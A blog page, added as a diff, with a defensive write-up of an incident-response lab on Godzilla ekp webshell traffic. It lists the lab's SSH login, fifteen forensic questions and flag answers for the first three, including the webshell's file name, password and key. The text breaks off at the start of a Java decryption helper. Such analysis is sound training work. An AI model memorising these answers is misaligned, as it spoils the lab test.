@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>哥斯拉ekp版本流量分析 - xia0le&#39;s Blog</title><meta name="author" content="xia0le">
+<meta name="description" content="哥斯拉ekp版本流量分析 前言 实战中使用的webshell连接工具基本上都是魔改或内部研发的，通过网上公开的哥斯拉ekp版本来学习如果HW中遇到魔改的应该如何去下手分析
+"><meta name="keywords" content='应急响应, 玄机, 哥斯拉流量分析'>
+  <meta itemprop="name" content="哥斯拉ekp版本流量分析">
+  <meta itemprop="description" content="哥斯拉ekp版本流量分析 前言 实战中使用的webshell连接工具基本上都是魔改或内部研发的，通过网上公开的哥斯拉ekp版本来学习如果HW中遇到魔改的应该如何去下手分析">
+  <meta itemprop="datePublished" content="2024-12-05T21:47:44+08:00">
+  <meta itemprop="dateModified" content="2024-12-05T21:47:44+08:00">
+  <meta itemprop="wordCount" content="607">
+  <meta itemprop="keywords" content="应急响应,玄机,哥斯拉流量分析"><meta property="og:url" content="http://localhost:1313/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">
+  <meta property="og:site_name" content="xia0le&#39;s Blog">
+  <meta property="og:title" content="哥斯拉ekp版本流量分析">
+  <meta property="og:description" content="哥斯拉ekp版本流量分析 前言 实战中使用的webshell连接工具基本上都是魔改或内部研发的，通过网上公开的哥斯拉ekp版本来学习如果HW中遇到魔改的应该如何去下手分析">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-12-05T21:47:44+08:00">
+    <meta property="article:modified_time" content="2024-12-05T21:47:44+08:00">
+    <meta property="article:tag" content="应急响应">
+    <meta property="article:tag" content="玄机">
+    <meta property="article:tag" content="哥斯拉流量分析">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="哥斯拉ekp版本流量分析">
+  <meta name="twitter:description" content="哥斯拉ekp版本流量分析 前言 实战中使用的webshell连接工具基本上都是魔改或内部研发的，通过网上公开的哥斯拉ekp版本来学习如果HW中遇到魔改的应该如何去下手分析">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="哥斯拉ekp版本流量分析 - xia0le&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/%E5%93%A5%E6%96%AF%E6%8B%894.0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="哥斯拉4.0流量分析" /><link rel="next" type="text/html" href="http://localhost:1313/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="某变异Webshell流量分析" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "哥斯拉ekp版本流量分析",
+    "inLanguage": "en-us",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90\/"
+    },"genre": "posts","keywords": "应急响应, 玄机, 哥斯拉流量分析","wordcount":  607 ,
+    "url": "http:\/\/localhost:1313\/posts\/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90\/","datePublished": "2024-12-05T21:47:44+08:00","dateModified": "2024-12-05T21:47:44+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "xia0le"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="xia0le&#39;s Blog"><span class="header-title-text">xia0le&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="xia0le&#39;s Blog"><span class="header-title-text">xia0le&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>哥斯拉ekp版本流量分析</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      xia0le</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="post-category" title="Category - 应急响应"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 应急响应</a></span></div><div class="post-meta-line"><span title="published on 2024-12-05 21:47:44"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-12-05">2024-12-05</time></span>&nbsp;<span title="607 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 700 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>3 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1黑客上传的木马文件名是什么">1、黑客上传的木马文件名是什么？</a></li>
+    <li><a href="#2黑客上传的木马连接密码是什么">2、黑客上传的木马连接密码是什么？</a></li>
+    <li><a href="#3黑客上传的木马连接密钥是什么">3、黑客上传的木马连接密钥是什么？</a></li>
+    <li><a href="#4黑客连接webshell后执行的第一条命令是什么">4、黑客连接webshell后执行的第一条命令是什么？</a></li>
+    <li><a href="#5这个木马是根据哪个参数进行回显的提交参数名">5、这个木马是根据哪个参数进行回显的？（提交参数名）</a></li>
+    <li><a href="#6黑客留下后门的反连的ip和port是什么flagipport">6、黑客留下后门的反连的IP和PORT是什么？（flag{IP,PORT})</a></li>
+    <li><a href="#7黑客通过后门反连执行的第一条命令是什么">7、黑客通过后门反连执行的第一条命令是什么？</a></li>
+    <li><a href="#8黑客新增的后门用户名密码是什么提交flagusernamepassword">8、黑客新增的后门用户名密码是什么？（提交flag{username,password}）</a></li>
+    <li><a href="#9黑客新增的后门文件是什么提交完整路径">9、黑客新增的后门文件是什么？（提交完整路径）</a></li>
+    <li><a href="#10黑客的后门公钥是什么提交公钥的md5值">10、黑客的后门公钥是什么？（提交公钥的md5值）</a></li>
+    <li><a href="#11黑客注入的内存马代理是那种类型的如flagfrp">11、黑客注入的内存马代理是那种类型的？（如flag{frp}）</a></li>
+    <li><a href="#12这个代理的路径是什么如flagfrp">12、这个代理的路径是什么？（如flag{/frp}）</a></li>
+    <li><a href="#13这个代理的连接密码是什么将得到的密码md5后作为flag提交">13、这个代理的连接密码是什么？（将得到的密码md5后作为flag提交）</a></li>
+    <li><a href="#14黑客扫描了哪个ip的哪些端口端口按照文本顺序提交即可-如flagip212223">14、黑客扫描了哪个ip的哪些端口？（端口按照文本顺序提交即可 如：flag{ip,21,22,23}）</a></li>
+    <li><a href="#15黑客扫描到开放的端口有哪些端口从小到大排序提交-如flag212223">15、黑客扫描到开放的端口有哪些？（端口从小到大排序提交 如：flag{21,22,23}）</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="哥斯拉ekp版本流量分析" class="heading-element"><span>哥斯拉ekp版本流量分析</span>
+  <a href="#%e5%93%a5%e6%96%af%e6%8b%89ekp%e7%89%88%e6%9c%ac%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h2 id="前言" class="heading-element"><span>前言</span>
+  <a href="#%e5%89%8d%e8%a8%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>实战中使用的webshell连接工具基本上都是魔改或内部研发的，通过网上公开的哥斯拉ekp版本来学习如果HW中遇到魔改的应该如何去下手分析</p>
+<p>请你登录服务器结合数据包附件来分析黑客的入侵行为</p>
+<p>用户名：root</p>
+<p>密码：toor</p>
+<p>SSH连接：ssh root@ip -p222</p>
+<h2 id="题目" class="heading-element"><span>题目</span>
+  <a href="#%e9%a2%98%e7%9b%ae" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h2 id="1黑客上传的木马文件名是什么" class="heading-element"><span>1、黑客上传的木马文件名是什么？</span>
+  <a href="#1%e9%bb%91%e5%ae%a2%e4%b8%8a%e4%bc%a0%e7%9a%84%e6%9c%a8%e9%a9%ac%e6%96%87%e4%bb%b6%e5%90%8d%e6%98%af%e4%bb%80%e4%b9%88" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>flag{.index.jsp}</p>
+<p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470157865-20241009183559-ck8cvla.png" alt="QQ_1728470157865" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470157865-20241009183559-ck8cvla.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470157865-20241009183559-ck8cvla.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470157865-20241009183559-ck8cvla.png?size=large 2x" data-title="QQ_1728470157865" style="--width: 2152px;--aspect-ratio: 2152 / 1686;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<h2 id="2黑客上传的木马连接密码是什么" class="heading-element"><span>2、黑客上传的木马连接密码是什么？</span>
+  <a href="#2%e9%bb%91%e5%ae%a2%e4%b8%8a%e4%bc%a0%e7%9a%84%e6%9c%a8%e9%a9%ac%e8%bf%9e%e6%8e%a5%e5%af%86%e7%a0%81%e6%98%af%e4%bb%80%e4%b9%88" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470169757-20241009183612-t5badwb.png" alt="QQ_1728470169757" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470169757-20241009183612-t5badwb.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470169757-20241009183612-t5badwb.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470169757-20241009183612-t5badwb.png?size=large 2x" data-title="QQ_1728470169757" style="--width: 2152px;--aspect-ratio: 2152 / 1686;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>flag{mypass}</p>
+<h2 id="3黑客上传的木马连接密钥是什么" class="heading-element"><span>3、黑客上传的木马连接密钥是什么？</span>
+  <a href="#3%e9%bb%91%e5%ae%a2%e4%b8%8a%e4%bc%a0%e7%9a%84%e6%9c%a8%e9%a9%ac%e8%bf%9e%e6%8e%a5%e5%af%86%e9%92%a5%e6%98%af%e4%bb%80%e4%b9%88" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727832971002-20241002093612-g4sk4c9.png" alt="QQ_1727832971002" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727832971002-20241002093612-g4sk4c9.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727832971002-20241002093612-g4sk4c9.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727832971002-20241002093612-g4sk4c9.png?size=large 2x" data-title="QQ_1727832971002" style="--width: 2042px;--aspect-ratio: 2042 / 1266;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>flag{9adbe0b3033881f8}</p>
+<h2 id="4黑客连接webshell后执行的第一条命令是什么" class="heading-element"><span>4、黑客连接webshell后执行的第一条命令是什么？</span>
+  <a href="#4%e9%bb%91%e5%ae%a2%e8%bf%9e%e6%8e%a5webshell%e5%90%8e%e6%89%a7%e8%a1%8c%e7%9a%84%e7%ac%ac%e4%b8%80%e6%9d%a1%e5%91%bd%e4%bb%a4%e6%98%af%e4%bb%80%e4%b9%88" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>前面都是哥斯拉初始化流量，这里开始用户执行</p>
+<p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470195033-20241009183637-jxtifoz.png" alt="QQ_1728470195033" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470195033-20241009183637-jxtifoz.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470195033-20241009183637-jxtifoz.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470195033-20241009183637-jxtifoz.png?size=large 2x" data-title="QQ_1728470195033" style="--width: 2152px;--aspect-ratio: 2152 / 1686;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>然后根据前面的jsp木马脚本进行解密</p>
+<p>请求解密</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.ezgame</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.URLDecoder</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.nio.charset.StandardCharsets</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Scanner</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
